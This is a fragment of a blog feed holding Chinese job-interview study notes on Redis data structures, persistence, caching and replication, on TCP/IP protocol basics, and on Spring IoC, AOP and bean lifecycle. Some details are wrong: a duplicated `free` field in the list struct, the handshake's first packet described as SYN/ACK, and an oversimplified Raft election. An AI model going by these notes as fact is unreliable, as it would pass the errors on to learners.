class="keyword">uint32_t</span> len; <span class="comment">//记录当前字节数组的长度</span></span><br><span class="line">    <span class="keyword">uint32_t</span> alloc; <span class="comment">//记录了当前字节数组总共分配的内存大小</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> flags; <span class="comment">//记录了当前字节数组的属性、用来标识到底是sdshdr8还是sdshdr16等</span></span><br><span class="line">    <span class="keyword">char</span> buf[]; <span class="comment">//保存了字符串真正的值以及末尾的一个\0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><blockquote><ol><li>记录数组的长度，把复杂度从o(n)变成了0(1)</li><li>SDS预分配存储空间的方式来减少内存的频繁分配</li><li>redis不同长度的字符串用不同的数据结构，因此用flag标记当前是什么类型的数据结构</li></ol></blockquote><h4 id="空间预分配"><a href="#空间预分配" class="headerlink" title="空间预分配"></a>空间预分配</h4><p>（sdscat =》给字符串后面再拼接一个字符串）</p><ul><li>当sdscat 之后内存小于 1M，字符串长度*2+1 （’\0’）</li><li>当sdscat 之后内存大于 1M, 字符串长度 + 1M + 1（’\0’） <h4 id="空间懒惰回收"><a href="#空间懒惰回收" class="headerlink" title="空间懒惰回收"></a>空间懒惰回收</h4>如果sdstrim（减少字符串），则不急着回收空间，下次如果需要添加长度，直接使用多余的空间。</li></ul><h3 id="List"><a href="#List" class="headerlink" title="List"></a>List</h3><blockquote><p>结构是双向链表<br>由于数据结构的设计，可以更方便的获取链表长度</p></blockquote><p>链表的数据结构<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">list</span>&#123;</span></span><br><span class="line">     <span class="comment">//表头节点</span></span><br><span class="line">     listNode *head;</span><br><span class="line">     <span class="comment">//表尾节点</span></span><br><span class="line">     listNode *tail;</span><br><span class="line">     <span class="comment">//链表所包含的节点数量</span></span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span> len;</span><br><span class="line">     <span class="comment">//节点值复制函数</span></span><br><span class="line">     <span class="keyword">void</span> (*<span class="built_in">free</span>) (<span class="keyword">void</span> *ptr);</span><br><span class="line">     <span class="comment">//节点值释放函数</span></span><br><span class="line">     <span class="keyword">void</span> (*<span class="built_in">free</span>) (<span class="keyword">void</span> *ptr);</span><br><span class="line">     <span class="comment">//节点值对比函数</span></span><br><span class="line">     <span class="keyword">int</span> (*match) (<span class="keyword">void</span> *ptr,<span class="keyword">void</span> *key);</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br></pre></td></tr></table></figure></p><p>ListNode节点数据结构<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span>&#123;</span></span><br><span class="line">       <span class="comment">//前置节点</span></span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">prev</span>;</span></span><br><span class="line">       <span class="comment">//后置节点</span></span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">listNode</span> *<span class="title">next</span>;</span></span><br><span class="line">       <span class="comment">//节点的值</span></span><br><span class="line">       <span class="keyword">void</span> *value;  </span><br><span class="line">&#125;listNode</span><br></pre></td></tr></table></figure></p><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p>哈希表<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictht</span> &#123;</span></span><br><span class="line">    <span class="comment">// 哈希表数组</span></span><br><span class="line">    dictEntry **table;</span><br><span class="line">    <span class="comment">// 哈希表大小</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="comment">// 哈希表大小掩码，用于计算索引值</span></span><br><span class="line">    <span class="comment">// 总是等于 size - 1</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> sizemask;</span><br><span class="line">    <span class="comment">// 该哈希表已有节点的数量</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> used;</span><br><span class="line">&#125; dictht;</span><br></pre></td></tr></table></figure></p><p>哈希表节点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dictEntry</span> &#123;</span></span><br><span class="line">    <span class="comment">// 键</span></span><br><span class="line">    <span class="keyword">void</span> *key;</span><br><span class="line">    <span class="comment">// 值</span></span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">void</span> *val;</span><br><span class="line">        <span class="keyword">uint64_t</span> u64;</span><br><span class="line">        <span class="keyword">int64_t</span> s64;</span><br><span class="line">    &#125; v;</span><br><span class="line">    <span class="comment">// 指向下个哈希表节点，形成链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dictEntry</span> *<span class="title">next</span>;</span>  <span class="comment">// 单链表结构</span></span><br><span class="line">&#125; dictEntry;</span><br></pre></td></tr></table></figure><p>字典<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">dict</span> &#123;</span></span><br><span class="line">    <span class="comment">// 类型特定函数</span></span><br><span class="line">    dictType *type;</span><br><span class="line">    <span class="comment">// 私有数据</span></span><br><span class="line">    <span class="keyword">void</span> *privdata;</span><br><span class="line">    <span class="comment">// 哈希表</span></span><br><span class="line">    dictht ht[<span class="number">2</span>];</span><br><span class="line">    <span class="comment">// rehash 索引</span></span><br><span class="line">    <span class="comment">// 当 rehash 不在进行时，值为 -1</span></span><br><span class="line">    <span class="keyword">int</span> rehashidx; <span class="comment">/* rehashing not in progress if rehashidx == -1 */</span></span><br><span class="line">&#125; dict;</span><br></pre></td></tr></table></figure></p><h4 id="rehash"><a href="#rehash" class="headerlink" title="rehash"></a>rehash</h4><blockquote><p>在字典中存在dictht数组，表明是两个hash表<br>ht[1]的容量是ht[0]的两倍<br>把ht[0]中的元素rehash复制到ht[1]中</p></blockquote><h4 id="渐进式rehash"><a href="#渐进式rehash" class="headerlink" title="渐进式rehash"></a>渐进式rehash</h4><p><a href="https://blog.csdn.net/wangmaohong0717/article/details/84611426" target="_blank" rel="noopener">原帖地址</a></p><blockquote><p>进行读操作：会先去ht[0]中找，找不到再去ht[1]中找。<br>进行写操作：直接写在ht[1]中。<br>进行删除操作：与读类似。</p></blockquote><p>但是每一次的增删改查的操作都会把数据从ht[0]转移到ht[1],是为了避免数据迁移导致的cpu负载问题</p><h3 id="有序集合的实现方式是哪种数据结构？"><a href="#有序集合的实现方式是哪种数据结构？" class="headerlink" title="有序集合的实现方式是哪种数据结构？"></a>有序集合的实现方式是哪种数据结构？</h3><blockquote><p>跳跃表</p></blockquote><h2 id="Redis怎样防止异常数据不丢失？"><a href="#Redis怎样防止异常数据不丢失？" class="headerlink" title="Redis怎样防止异常数据不丢失？"></a>Redis怎样防止异常数据不丢失？</h2><h3 id="RDB-持久化"><a href="#RDB-持久化" class="headerlink" title="RDB 持久化"></a>RDB 持久化</h3><blockquote><p>将某个时间点的所有数据都存放到硬盘上。<br>可以将快照复制到其它服务器从而创建具有相同数据的服务器副本。<br>如果系统发生故障，将会丢失最后一次创建快照之后的数据。<br>如果数据量很大，保存快照的时间会很长。</p></blockquote><h3 id="AOF-持久化"><a href="#AOF-持久化" class="headerlink" title="AOF 持久化"></a>AOF 持久化</h3><blockquote><p>将写命令添加到 AOF 文件（Append Only File）的末尾。<br>使用 AOF 持久化需要设置同步选项，从而确保写命令同步到磁盘文件上的时机。这是因为对文件进行写入并不会马上将内容同步到磁盘上，而是先存储到缓冲区，然后由操作系统决定什么时候同步到磁盘。有以下同步选项：<br>选项同步频率always每个写命令都同步everysec每秒同步一次no让操作系统来决定何时同步<br>always 选项会严重减低服务器的性能；<br>everysec 选项比较合适，可以保证系统崩溃时只会丢失一秒左右的数据，并且 Redis 每秒执行一次同步对服务器性能几乎没有任何影响；<br>no 选项并不能给服务器性能带来多大的提升，而且也会增加系统崩溃时数据丢失的数量<br>随着服务器写请求的增多，AOF 文件会越来越大。Redis 提供了一种将 AOF 重写的特性，能够去除 AOF 文件中的冗余写命令。</p></blockquote><h2 id="讲一讲缓存穿透，缓存雪崩以及缓存击穿吧"><a href="#讲一讲缓存穿透，缓存雪崩以及缓存击穿吧" class="headerlink" title="讲一讲缓存穿透，缓存雪崩以及缓存击穿吧"></a>讲一讲缓存穿透，缓存雪崩以及缓存击穿吧</h2><ul><li>缓存穿透：就是客户持续向服务器发起对不存在服务器中数据的请求。客户先在Redis中查询，查询不到后去数据库中查询。</li><li>缓存击穿：就是一个很热门的数据，突然失效，大量请求到服务器数据库中</li><li>缓存雪崩：就是大量数据同一时间失效。</li></ul><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><ul><li>缓存穿透：<br>1.接口层增加校验，对传参进行个校验，比如说我们的id是从1开始的，那么id&lt;=0的直接拦截；<br>2.缓存中取不到的数据，在数据库中也没有取到，这时可以将key-value对写为key-null，这样可以防止攻击用户反复用同一个id暴力攻击</li><li>缓存击穿：<br>最好的办法就是设置热点数据永不过期，拿到刚才的比方里，那就是你买腾讯一个永久会员</li><li>缓存雪崩：<br>1.缓存数据的过期时间设置随机，防止同一时间大量数据过期现象发生。<br>2.如果缓存数据库是分布式部署，将热点数据均匀分布在不同搞得缓存数据库中。</li></ul><h2 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h2><h3 id="主从同步过程"><a href="#主从同步过程" class="headerlink" title="主从同步过程"></a>主从同步过程</h3><blockquote><ol><li>master启动线程生成RDB                                 </li><li>同时master把新增的请求放到内存中          </li><li>slaver先将RDB文件写入磁盘                      </li><li>slaver把RDB写入磁盘后再加载到内存中</li><li>最后master将缓存的请求再发送给slaver</li></ol></blockquote><h4 id="同步过程细述"><a href="#同步过程细述" class="headerlink" title="同步过程细述"></a>同步过程细述</h4><ol><li>客户端向服务器发送SLAVEOF命令，让当前服务器成为Slave；<blockquote><p>从节点执行slaveof保存主节点信息<br>从节点通过定时任务发现主节点信息，并建立连接<br>从节点发送ping命令，主节点则返回pong命令<br>成功建立连接</p></blockquote></li><li>从节点根据自己是否保存Master runid来判断是否是第一次复制,</li><li>如果是第一次复制，则进行全量复制，从节点向Master发送PSYNC ? -1 命令来进行完整同步；</li><li>如果不是第一次复制，从节点向Master发送PSYNC runid offset；</li><li>Master接收到PSYNC 命令后首先判断runid是否和本机的id一致，如果一致则会再次判断offset偏移量和本机的偏移量相差有没有超过 大小，如果没有那么就给Slave发送CONTINUE，此时Slave只需要等待Master传回失去连接期间丢失的命令；如果runid和本机id不一致或者双方offset差距超过了复制积压缓冲区大小，那么就会返回FULLRESYNC runid offset，Slave将runid保存起来，并进行完整同步。<blockquote><p>上述涉及三个信号<br>FullReSync -&gt; 全量复制信号<br>Continue -&gt; 部分复制信号<br>Err -&gt; psync进行部分复制的时候发现，offset偏移量和主节点的偏移量超过了复制积压缓存区，返回错误信号，进行全量复制FullResync</p></blockquote></li></ol><h3 id="哨兵"><a href="#哨兵" class="headerlink" title="哨兵"></a>哨兵</h3><p><a href="https://mp.weixin.qq.com/s/nDqNYC0wYFH2Y21acAGNiw?from=groupmessage&amp;scene=1&amp;subscene=10000&amp;clicktime=1585109654&amp;enterid=1585109654" target="_blank" rel="noopener">原帖地址</a></p><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><h5 id="1-定时任务"><a href="#1-定时任务" class="headerlink" title="1. 定时任务"></a>1. 定时任务</h5><ul><li>通过向主从节点发送info命令获取最新的主从结构；</li><li>通过发布订阅功能获取其他哨兵节点的信息；</li><li>通过向其他节点发送ping命令进行心跳检测，判断是否下线<h5 id="2-主观下线"><a href="#2-主观下线" class="headerlink" title="2. 主观下线"></a>2. 主观下线</h5><blockquote><p>心跳检测的定时任务中，如果其他节点超过一定时间没有回复，哨兵节点就会将其进行主观下线。顾名思义，主观下线的意思是一个哨兵节点“主观地”判断下线</p></blockquote><h5 id="3-客观下线"><a href="#3-客观下线" class="headerlink" title="3. 客观下线"></a>3. 客观下线</h5><blockquote><p>哨兵节点在对主节点进行主观下线后，会通过sentinel is-master-down-by-addr命令询问其他哨兵节点该主节点的状态；如果判断主节点下线的哨兵数量达到一定数值，则对该主节点进行客观下线。<br><strong>客观下线是主节点才有的概念；如果从节点和哨兵节点发生故障，被哨兵主观下线后，不会再有后续的客观下线和故障转移操作</strong></p></blockquote><h5 id="4-选举领导者哨兵节点"><a href="#4-选举领导者哨兵节点" class="headerlink" title="4. 选举领导者哨兵节点"></a>4. 选举领导者哨兵节点</h5><blockquote><p>Raft算法 ： 哪个节点先发出申请成为主节点，哪个节点就当master</p></blockquote><h5 id="5-故障转移"><a href="#5-故障转移" class="headerlink" title="5. 故障转移"></a>5. 故障转移</h5></li></ul><ol><li>先过滤不健康的节点</li><li>根据优先级推荐出节点</li><li>选出来的节点成为主节点</li><li>原来的主节点变成新的主节点的从节点</li></ol><h2 id="Redis-和-Memcached-有啥区别，为啥选择用Redis作为你们的缓存中间件？"><a href="#Redis-和-Memcached-有啥区别，为啥选择用Redis作为你们的缓存中间件？" class="headerlink" title="Redis 和 Memcached 有啥区别，为啥选择用Redis作为你们的缓存中间件？"></a>Redis 和 Memcached 有啥区别，为啥选择用Redis作为你们的缓存中间件？</h2><ol><li>Redis 相比 Memcached 来说，拥有更多的数据结构，能支持更丰富的数据操作。</li><li>在 redis3.x 版本中，便能支持 Cluster 模式，而 Memcached 没有原生的集群模式</li><li>Redis 只使用单核，而 Memcached 可以使用多核，所以平均每一个核上 Redis 在存储小数据时比 Memcached 性能更高。而在 100k 以上的数据中，Memcached 性能要高于 Redis，虽然 Redis 最近也在存储大数据的性能上进行优化，但是比起 Remcached，还是稍有逊色</li><li>memecache 把数据全部存在内存之中，断电后会挂掉，数据不能超过内存大小 </li></ol><h2 id="Redis事务"><a href="#Redis事务" class="headerlink" title="Redis事务"></a>Redis事务</h2><blockquote><p>Redis 事务的本质是一组命令的集合。事务支持一次执行多个命令，一个事务中所有命令都会被序列化。在事务执行过程，会按照顺序串行化执行队列中的命令，其他客户端提交的命令请求不会插入到事务执行命令序列中。<br>Redis的事务本质上就是一串命令的执行，已经不可被打断</p></blockquote></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;别问 问就是为了面试豁出了老命&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《天净沙·我·网络协议篇》  双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？</title>
    <link href="http://runindark.com/2020/03/13/2020%E6%98%A5%E6%8B%9B/%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE/"/>
    <id>http://runindark.com/2020/03/13/2020春招/我为阿里-网络协议/</id>
    <published>2020-03-13T03:52:12.673Z</published>
    <updated>2020-06-28T01:43:26.138Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>别问 问就是为了面试豁出了老命<br><a id="more"></a></excerpt></p><the rest="" of="" contents="" |="" 余下全文=""><h2 id="五层协议体系结构"><a href="#五层协议体系结构" class="headerlink" title="五层协议体系结构"></a>五层协议体系结构</h2><ol start="5"><li>应用层<blockquote><p>顾名思义就是上层的网络应用 域名，Http协议等</p></blockquote></li><li>运输层<blockquote><p>两台主机之间提供统用的数据传输服务</p></blockquote></li><li>网络层<blockquote><p>选择合适的路由进行数据交换</p></blockquote></li><li>数据链路层<blockquote><p>一段一段的将数据发送</p></blockquote></li><li>物理层<blockquote><p>物理主机之间的比特流交换</p></blockquote></li></ol><h2 id="三次握手四次挥手"><a href="#三次握手四次挥手" class="headerlink" title="三次握手四次挥手"></a>三次握手四次挥手</h2><h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p><img src="https://upload-images.jianshu.io/upload_images/7368936-abf0a9b7fc6c8eb3.png?imageMogr2/auto-orient/strip|imageView2/2/w/470/format/webp" alt=""></p><ol><li>第一次握手： 客户端（client）向接收端（server）发送标志SYN/ACK，但是 <strong>客户端什么都不知道（接收端直到了自己接收正常，也知道客户端发送正常）</strong> </li><li>第二次握手： 接收端（server）向客户端（client）发送标志SYN/ACK数据包，现在<strong>客户端知道自己接收正常，自己发送正常，但是服务端不知道自己是不是发送正常</strong></li><li>第三次握手， 客户端（client）向接收端（server）发送标志ACK数据包，现在<strong>客户端知道自己发送接收正常，服务端也直到自己发送接收正常</strong></li></ol><blockquote><p>总结：三次握手的原因就是因为数据传输时单向的，对方接收后，发送方属于不知情着，所以才有了三次握手</p></blockquote><h4 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h4><p><img src="https://img-blog.csdn.net/20170606084851272?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXpjc3U=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p><ol><li>客户端向接收端发送Fin请求，告诉接收端说我这边没什么要发送的了</li><li>接收端向客户端发送一个ACK，告诉客户端说我知道你这边没啥要发送的了</li><li>接收端向客户端发送一个Fin，也告诉客户端说我也没什么要发送的了</li><li>客户端也发送一个ACK给接收端，确认知道了接收端没什么要发送的了</li></ol><h2 id="TCP-VS-UDP"><a href="#TCP-VS-UDP" class="headerlink" title="TCP VS UDP"></a>TCP VS UDP</h2><blockquote><p>TCP保证可靠的连接，UDP只负责交付数据，因此UDP占用的资源少，发送的数据多，TCP占用资源多，发送的数据较少，但是保证了数据传输的绝对稳定</p></blockquote><h3 id="TCP为啥稳定"><a href="#TCP为啥稳定" class="headerlink" title="TCP为啥稳定"></a>TCP为啥稳定</h3><ul><li>TCP会把数据自动分成合适有序有编号的数据包</li><li>TCP发送的时候会对头部和数据进行校验</li><li>TCP会有流量控制，会设立缓冲区，每次发送的时候也是从缓冲区中读取发送</li><li>发送超时会重新进行发送</li></ul></the>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;excerpt in=&quot;&quot; index=&quot;&quot; |=&quot;&quot; 首页摘要=&quot;&quot;&gt;&lt;br&gt;别问 问就是为了面试豁出了老命&lt;br&gt;&lt;/excerpt&gt;&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>《天净沙·我·Spring》  双非菜鸡奇葩，面试项目框架，java java，卑微学子去哪？</title>
    <link href="http://runindark.com/2020/03/12/2020%E6%98%A5%E6%8B%9B/%E6%88%91%E4%B8%BA%E9%98%BF%E9%87%8C-Spring/"/>
    <id>http://runindark.com/2020/03/12/2020春招/我为阿里-Spring/</id>
    <published>2020-03-12T15:02:23.758Z</published>
    <updated>2020-06-28T01:43:26.634Z</updated>
    
    <content type="html"><![CDATA[<p><excerpt in="" index="" |="" 首页摘要=""><br>别问 问就是为了面试豁出了老命<br>[文章都是搬运艿艿的]<br>[<a href="http://svip.iocoder.cn/Java/Core/Interview/]" target="_blank" rel="noopener">http://svip.iocoder.cn/Java/Core/Interview/]</a></excerpt></p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="Spring-核心组件-（8大模块）"><a href="#Spring-核心组件-（8大模块）" class="headerlink" title="Spring 核心组件 （8大模块）"></a>Spring 核心组件 （8大模块）</h2><h3 id="Spring-Core"><a href="#Spring-Core" class="headerlink" title="Spring Core"></a>Spring Core</h3><blockquote><p>核心容易，主要是提供Ioc的依赖注入功能</p></blockquote><h3 id="Spring-Aspects"><a href="#Spring-Aspects" class="headerlink" title="Spring Aspects"></a>Spring Aspects</h3><blockquote><p>为了让Spring可以更好的融合AspectJ，实际上也是切面</p></blockquote><h3 id="Spring-AOP"><a href="#Spring-AOP" class="headerlink" title="Spring AOP"></a>Spring AOP</h3><blockquote><p>提供了面向切面编程的实现</p></blockquote><h3 id="Spring-JDBC"><a href="#Spring-JDBC" class="headerlink" title="Spring JDBC"></a>Spring JDBC</h3><blockquote><p>数据库连接驱动</p></blockquote><h3 id="Spring-JMS"><a href="#Spring-JMS" class="headerlink" title="Spring JMS"></a>Spring JMS</h3><blockquote><p>Java 消息服务（ Java Message Service  ， JMS ）</p></blockquote><h3 id="Spring-ORM"><a href="#Spring-ORM" class="headerlink" title="Spring ORM"></a>Spring ORM</h3><blockquote><p>ORM的全称是Object Relational Mapping，即对象关系映射 ==&gt; 为Mybatis，Hibernate提供支持</p></blockquote><h3 id="Spring-Web"><a href="#Spring-Web" class="headerlink" title="Spring Web"></a>Spring Web</h3><blockquote><p>为Web应用提供支持</p></blockquote><h3 id="Spring-Test"><a href="#Spring-Test" class="headerlink" title="Spring Test"></a>Spring Test</h3><blockquote><p>顾名思义就是为了测试 Junit等</p></blockquote><h2 id="RestController-vs-Controller"><a href="#RestController-vs-Controller" class="headerlink" title="@RestController  vs @Controller"></a>@RestController  vs @Controller</h2><h3 id="Controller"><a href="#Controller" class="headerlink" title="@Controller"></a>@Controller</h3><blockquote><p>如果是@Controler，Return的值将直接指向一个页面，或者用转发和重定向的方式<br>如果加上@ResponseBody 那么就是@Controller</p></blockquote><h3 id="RestController"><a href="#RestController" class="headerlink" title="@RestController"></a>@RestController</h3><blockquote><p>也就是 前后分离 模式下最常用的解决方式</p></blockquote><h3 id="Request-Response-的过程"><a href="#Request-Response-的过程" class="headerlink" title="Request / Response 的过程"></a>Request / Response 的过程</h3><blockquote><p>DispatcherServlet -&gt; Handler Mapping -&gt; Controller/RestController<br>如果是 @Controller则是继续到View层 ，如果是@RestController 直接返回Client</p></blockquote><h2 id="谈谈自己对IOC的理解"><a href="#谈谈自己对IOC的理解" class="headerlink" title="谈谈自己对IOC的理解"></a>谈谈自己对IOC的理解</h2><blockquote><p>谈到Ioc就是一种托付的关系，最传统的应用所创建的对象等全部都托付给系统本身之间的<br>依赖,无论耦合度，都是在不断的变大，Ioc控制反转，也就是责任托付从系统本身变成了<br>由Ioc容器管理，我们只需要明白自己需要什么，不用去想怎么管理怎么创建，如果需要的话可以直接使用xml，注解等方式直接配置引用</p></blockquote><h2 id="Ioc初始化机制"><a href="#Ioc初始化机制" class="headerlink" title="Ioc初始化机制"></a>Ioc初始化机制</h2><blockquote><p>XML &gt;读取&gt; Resource &gt;解析&gt; BeanDefinition &gt;注册&gt; BeanFactory</p></blockquote><blockquote><p>xml 是程序员的配置 ，并根据反射机制可以通过BeanDefinition映射，在BeanFactory中创建出对象</p></blockquote><h2 id="AOP-面向切面编程"><a href="#AOP-面向切面编程" class="headerlink" title="AOP 面向切面编程"></a>AOP 面向切面编程</h2><blockquote><p>Aop就是一种想要把自己构造出来的方法切入到某个已经写好的类指定的方法之中</p></blockquote><h3 id="1-通知（Advice）"><a href="#1-通知（Advice）" class="headerlink" title="1.通知（Advice）"></a>1.通知（Advice）</h3><blockquote><p>自己需要在某类的指定方法上实现的功能，日志，事务，安全等功能</p></blockquote><h3 id="2-连接点（JoinPoint）"><a href="#2-连接点（JoinPoint）" class="headerlink" title="2.连接点（JoinPoint）"></a>2.连接点（JoinPoint）</h3><blockquote><p>就是Spring中可以插入通知的地方</p></blockquote><h3 id="3-切入点（Pointcut）"><a href="#3-切入点（Pointcut）" class="headerlink" title="3.切入点（Pointcut）"></a>3.切入点（Pointcut）</h3><blockquote><p>就是在需要插入通知的方法重新实现一下，可以说是作为一个标记</p></blockquote><h3 id="4-切面（Aspect）"><a href="#4-切面（Aspect）" class="headerlink" title="4.切面（Aspect）"></a>4.切面（Aspect）</h3><blockquote><p>就是切入点和通知放在一起，同时构成的一个类的某个位置</p></blockquote><h3 id="5-引入（introduction）"><a href="#5-引入（introduction）" class="headerlink" title="5.引入（introduction）"></a>5.引入（introduction）</h3><blockquote><p>就是把切面的功能正式融入到类中使用</p></blockquote><h3 id="6-目标（target）"><a href="#6-目标（target）" class="headerlink" title="6.目标（target）"></a>6.目标（target）</h3><blockquote><p>别切入的类</p></blockquote><h3 id="7-代理-proxy"><a href="#7-代理-proxy" class="headerlink" title="7.代理(proxy)"></a>7.代理(proxy)</h3><blockquote><p>Java的动态代理机制　　</p></blockquote><h3 id="8-织入-weaving"><a href="#8-织入-weaving" class="headerlink" title="8.织入(weaving)"></a>8.织入(weaving)</h3><blockquote><p>引入到类中后，开始正式的调用</p></blockquote><h3 id="串读理解"><a href="#串读理解" class="headerlink" title="串读理解"></a>串读理解</h3><h4 id="Java的动态代理机制"><a href="#Java的动态代理机制" class="headerlink" title="Java的动态代理机制"></a>Java的动态代理机制</h4><h5 id="Proxy-InvocationHandler"><a href="#Proxy-InvocationHandler" class="headerlink" title="Proxy + InvocationHandler"></a>Proxy + InvocationHandler</h5><blockquote><p>让目标类implemet InvocationHandler<br>再调用的时候，利用Proxy的静态方法newProxyInstance() ，通过反射机制，调用目标类的方法等</p></blockquote><h5 id="CGLIB"><a href="#CGLIB" class="headerlink" title="CGLIB"></a>CGLIB</h5><blockquote><p>生成目标类的一个子类</p></blockquote><h4 id="解读"><a href="#解读" class="headerlink" title="解读"></a>解读</h4><blockquote><p>在理解切面之后，深入到方法本身，如何去插入一个另外写好的类，就是在程序运行时<br>利用动态代理的特点，在调用某个方法的时候，再调用proxy将另一个方法调用进去，<br>Before/After等，所以与其说是切入了方法，不如说是切入到了动态代理的执行过程中</p></blockquote><h2 id="SpringBean"><a href="#SpringBean" class="headerlink" title="SpringBean"></a>SpringBean</h2><h3 id="SpringBean-的作用域"><a href="#SpringBean-的作用域" class="headerlink" title="SpringBean 的作用域"></a>SpringBean 的作用域</h3><blockquote><p>Request :每次HTTP请求都会创建一个新的Bean<br>Session :同一个HTTP Session共享一个Bean，不同Session使用不同Bean<br>singleton : 唯一的bean实例<br>prototype : 每次请求都会创建一个新的bean实例</p></blockquote><blockquote><p>SpringBean没有解决线程安全问题<br>可以用ThreadLocal成员变量</p></blockquote><h3 id="Bean的生命周期"><a href="#Bean的生命周期" class="headerlink" title="Bean的生命周期"></a>Bean的生命周期</h3><p><img src="https://www.javazhiyin.com/wp-content/uploads/2019/05/java0-1558500658.jpg" alt="Bean生命周期"></p><ol><li>创建调用构造函数</li><li>set方法注入属性</li><li>BeanNameAware</li><li>BeanFactoryAware</li><li>ApplicationContextAware</li><li>BeanPostProcessor的before方法</li><li>initializingBean</li><li>自定义init方法</li><li>BeanPostProcessor的after方法</li><li>使用</li><li>容器的销毁</li><li>DisposableBean的destry</li><li>自定义的销毁方法</li></ol><ul><li><p>Spring启动，查找并加载需要被Spring管理的bean，进行Bean的实例化</p></li><li><p>Bean实例化后对将Bean的引入和值注入到Bean的属性中</p></li><li><p>如果Bean实现了BeanNameAware接口的话，Spring将Bean的Id传递给setBeanName()方法</p></li><li><p>如果Bean实现了BeanFactoryAware接口的话，Spring将调用setBeanFactory()方法，将BeanFactory容器实例传入</p></li><li><p>如果Bean实现了ApplicationContextAware接口的话，Spring将调用Bean的setApplicationContext()方法，将bean所在应用上下文引用传入进来。</p></li><li><p>如果Bean实现了BeanPostProcessor接口，Spring就将调用他们的postProcessBeforeInitialization()方法。</p></li><li><p>如果Bean 实现了InitializingBean接口，Spring将调用他们的afterPropertiesSet()方法。类似的，如果bean使用init-method声明了初始化方法，该方法也会被调用</p></li><li><p>如果Bean 实现了BeanPostProcessor接口，Spring就将调用他们的postProcessAfterInitialization()方法。</p></li><li><p>此时，Bean已经准备就绪，可以被应用程序使用了。他们将一直驻留在应用上下文中，直到应用上下文被销毁。</p></li><li><p>如果bean实现了DisposableBean接口，Spring将调用它的destory()接口方法，同样，如果bean使用了destory-method 声明销毁方法，该方法也会被调用。</p><h3 id="Bean-和-Component"><a href="#Bean-和-Component" class="headerlink" title="@Bean 和  @Component"></a>@Bean 和  @Component</h3><h4 id="Bean"><a href="#Bean" class="headerlink" title="@Bean"></a>@Bean</h4><blockquote><p>修饰方法级  可以用Autowired装配</p></blockquote><h4 id="Component"><a href="#Component" class="headerlink" title="@Component"></a>@Component</h4><blockquote><p>用于修饰类级别 可以用@CompontScan装配</p></blockquote></li></ul><h2 id="SpringMVC-工作流程"><a 